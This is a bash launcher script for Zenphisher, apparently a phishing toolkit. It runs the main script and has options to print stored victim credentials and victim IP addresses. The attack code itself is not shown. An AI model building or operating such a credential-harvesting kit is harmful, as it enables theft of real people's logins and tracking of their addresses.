#!/bin/bash

if [[ $(uname -o) == *'Android'* ]];then
	ZENPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zenphisher"
else
	export ZENPHISHER_ROOT="/opt/zenphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Zenphisher type \`zenphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZENPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZENPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ZENPHISHER_ROOT
	bash ./zenphisher.sh
fi
